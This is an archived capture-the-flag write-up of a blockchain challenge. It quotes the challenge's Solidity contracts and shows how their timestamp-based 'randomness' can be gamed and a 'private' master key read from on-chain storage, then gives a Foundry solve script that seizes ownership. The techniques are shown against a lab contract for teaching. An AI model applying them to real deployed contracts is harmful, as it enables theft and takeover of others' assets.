# Injus_Gambit

**CTF:** TCP1P 2024  
**Category:** blockchain  
**Original writeup:** <https://blog.deadsec.sh/post/tcp1p-blockchain-ctf/> — by **blog.deadsec.sh**. All credit goes to the original author; this is an archived copy.

---

Inju’s Gambit

This challenge was more of a misc challenge to me. but nonetheless the solution was interesting in this challenge we have 2 contracts:

Privileged : contract handling the access control restrictions and the privileges

: contract handling the access control restrictions and the privileges ChallengeManager : a contract that grants privileges to other parties

the goal in Setup.sol was this :

function isSolved () public view returns ( bool ){ return address (privileged.challengeManager()) == address ( 0 ); }

Luckily Privileged.sol contains this function:

function fireManager () public onlyOwner{ challengeManager = address ( 0 ); }

Looks easy we just need to bypass the modifier:

modifier onlyOwner () { if (msg.sender != casinoOwner){ revert Privileged_NotHighestPrivileged(); } _ ; }

So in order to become the owner we need to interact with the ChallengeManager

function approach () public payable { if (msg.value != 5 ether ){ revert CM_NotTheCorrectValue(); } if (approached[msg.sender] == true ){ revert CM_AlreadyApproached(); } approached[msg.sender] = true ; challenger.push(msg.sender); privileged.mintChallenger(msg.sender); }

we just need to depoist 5 ether to start the challenge but the next step is to upgrade our privileges

function upgradeChallengerAttribute ( uint256 challengerId, uint256 strangerId) public stillSearchingChallenger { //makes sure a valid id is being used if (challengerId > privileged.challengerCounter()){ revert CM_InvalidIdOfChallenger(); } //same as before if (strangerId > privileged.challengerCounter()){ revert CM_InvalidIdofStranger(); } //you can only challenge using your own account if (privileged.getRequirmenets(challengerId).challenger != msg.sender){ revert CM_CanOnlyChangeSelf(); } //calculates a somewhat random hash using the block.timestamp as a seed uint256 gacha = uint256 (keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4 ; if (gacha == 0 ){ //upgrade the stranger if (privileged.getRequirmenets(strangerId).isRich == false ){ privileged.upgradeAttribute(strangerId, true , false , false , false ); } else if (privileged.getRequirmenets(strangerId).isImportant == false ){ privileged.upgradeAttribute(strangerId, true , true , false , false ); } else if (privileged.getRequirmenets(strangerId).hasConnection == false ){ privileged.upgradeAttribute(strangerId, true , true , true , false ); } else if (privileged.getRequirmenets(strangerId).hasVIPCard == false ){ privileged.upgradeAttribute(strangerId, true , true , true , true ); qualifiedChallengerFound = true ; theChallenger = privileged.getRequirmenets(strangerId).challenger; } } else if (gacha == 1 ){ //upgrade the challenger if (privileged.getRequirmenets(challengerId).isRich == false ){ privileged.upgradeAttribute(challengerId, true , false , false , false ); } else if (privileged.getRequirmenets(challengerId).isImportant == false ){ privileged.upgradeAttribute(challengerId, true , true , false , false ); } else if (privileged.getRequirmenets(challengerId).hasConnection == false ){ privileged.upgradeAttribute(challengerId, true , true , true , false ); } else if (privileged.getRequirmenets(challengerId).hasVIPCard == false ){ privileged.upgradeAttribute(challengerId, true , true , true , true ); qualifiedChallengerFound = true ; theChallenger = privileged.getRequirmenets(challengerId).challenger; } } else if (gacha == 2 ){ // nuke the challenger privileged.resetAttribute(challengerId); qualifiedChallengerFound = false ; theChallenger = address ( 0 ); } else { //nuke the strager privileged.resetAttribute(strangerId); qualifiedChallengerFound = false ; theChallenger = address ( 0 ); } }

what caught my eye first was that there’s no check whether stangerId == challengerId which implies we can just challenge ourselve and account for the 0 and 1 cases as one.

So now how can I time this function properly to elevate my privileges ? at the begining I expiremented with just randomly spamming upgradeChallengerAttribute(myid,myid) and after a couple of tries I managed to get it through but this solution wasn’t satisfying neither interesting so I wrote a solve script with foundry again :P

after that we are left with the last part of the ChallengeManager.sol contract:

bytes32 private masterKey; function challengeCurrentOwner ( bytes32 _key) public onlyChosenChallenger{ if (keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){ privileged.setNewCasinoOwner( address (theChallenger)); } }

YOU: Oh no it’s a private variable what are we gonna dooo ?????



ME: Chillout it’s the blockchain ;)

private is a non-existent term when it comes to the blockchain, we can easily read any value using web3.js

const web3 = new Web3 ( '<rpc>' ); console . log ( web3 . eth . getStorageAt ( "0x9d9842E37E5e6786D07aa4AD7173488b7D247d9B" , 1 , ( e , v ) => console . log ( v ))) > 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559

we read the index 1 because that’s where the masterkey variable is stored in the memory of the smart contract

and now we put it all together here you might have to run it twice if you aren’t lucky enough just due to randomness there are better ways to estimate the precise moment but do you really care ??

// the setup part was the same as the previous one so I emitted here to save space function run () public { vm.startBroadcast(); if ( ! ch.approached(msg.sender)){ ch.approach{value : 5 e18}(); } uint256 gacha = uint256 (keccak256(abi.encodePacked( address (this), block.timestamp))) % 4 ; //check if (gacha == 0 || gacha == 1 ) { uint i = 0 ; while (i != 4 ){ ch.upgradeChallengerAttribute( 3 , 3 ); //assuming we are the 3rd challenge after the setup script i ++ ; } ch.challengeCurrentOwner( 0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559 ); p.fireManager(); } vm.stopBroadcast(); }
